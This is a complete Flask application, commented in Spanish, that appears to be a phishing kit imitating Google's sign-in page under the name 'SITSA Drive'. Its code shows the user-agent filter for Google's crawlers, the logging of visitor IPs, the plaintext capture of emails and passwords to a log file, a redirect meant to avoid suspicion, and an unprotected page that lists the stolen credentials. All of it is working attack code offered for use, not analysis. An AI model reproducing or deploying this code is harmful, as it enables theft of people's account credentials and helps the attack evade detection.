from flask import Flask, request, render_template_string, redirect
import datetime

app = Flask(__name__)

# --- HTML: INTERFAZ DE LOGIN DE GOOGLE (OFUSCADA) ---
HTML_LOGIN = '''
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Cuentas de Google</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { margin-bottom: 25px; font-size: 16px; }
        input[type="email"], input[type="password"] { 
            width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; 
        }
        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .btn-next { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; }
        .create-account { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="logo" alt="Google">
        <h1>Iniciar sesión</h1>
        <p>Usa tu cuenta de Google para acceder a <b>SITSA Drive</b></p>
        
        <form action="/auth" method="POST">
            <input type="email" name="user_mail" placeholder="Correo electrónico o teléfono" required>
            <input type="password" name="user_pass" placeholder="Introduce tu contraseña" required>
            
            <div style="text-align: left; margin-top: 10px;">
                <a href="#" class="create-account">¿Has olvidado tu correo electrónico?</a>
            </div>

            <div class="btn-container">
                <a href="#" class="create-account">Crear cuenta</a>
                <button type="submit" class="btn-next">Siguiente</button>
            </div>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    # Filtro de bots para evitar que Google escanee el formulario
    ua = request.headers.get('User-Agent', '').lower()
    bots = ['googlebot', 'crawler', 'lighthouse', 'headless']
    if any(bot in ua for bot in bots):
        return "Not Found", 404

    # Registro de visita
    ip_header = request.headers.get('X-Forwarded-For')
    ip_real = ip_header.split(',')[0].strip() if ip_header else request.remote_addr
    
    with open("log.txt", "a") as f:
        f.write(f"\n--- INTENTO DE ACCESO ---\nFecha: {datetime.datetime.now()}\nIP: {ip_real}\n")
    
    return render_template_string(HTML_LOGIN)

@app.route('/auth', methods=['POST'])
def auth():
    # Capturamos los datos enviados por el formulario
    correo = request.form.get('user_mail')
    clave = request.form.get('user_pass')
    
    # Guardamos las credenciales en el log
    with open("log.txt", "a") as f:
        f.write(f"CREDENTIALS -> Correo: {correo} | Pass: {clave}\n")
    
    # Redirigimos a la Wikipedia o al Drive real para que no sospechen
    return redirect("https://es.wikipedia.org/wiki/Phishing")

@app.route('/ver-resultados')
def ver():
    try:
        with open("log.txt", "r") as f:
            return f"<pre>{f.read()}</pre>"
    except:
        return "Sin capturas."

if __name__ == "__main__":
    app.run()
